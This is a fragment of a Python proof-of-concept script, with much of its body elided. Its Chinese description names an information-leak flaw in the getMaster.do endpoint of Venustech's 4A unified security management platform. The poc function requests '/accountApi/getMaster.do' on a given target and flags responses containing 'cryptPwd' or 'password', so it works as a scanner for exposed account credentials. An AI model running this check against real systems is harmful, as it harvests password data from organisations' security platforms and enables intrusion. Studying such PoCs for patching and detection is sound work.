...
def main():
    banner()
    parser = argparse.ArgumentParser(description="启明星辰4A统一安全管控平台getMaster.do信息泄漏漏洞")
...
def poc(target):
    payload_url = '/accountApi/getMaster.do'
    ...
    try:
        ...
        if '"state":true' in res or 'cryptPwd' in res or 'password' in res:
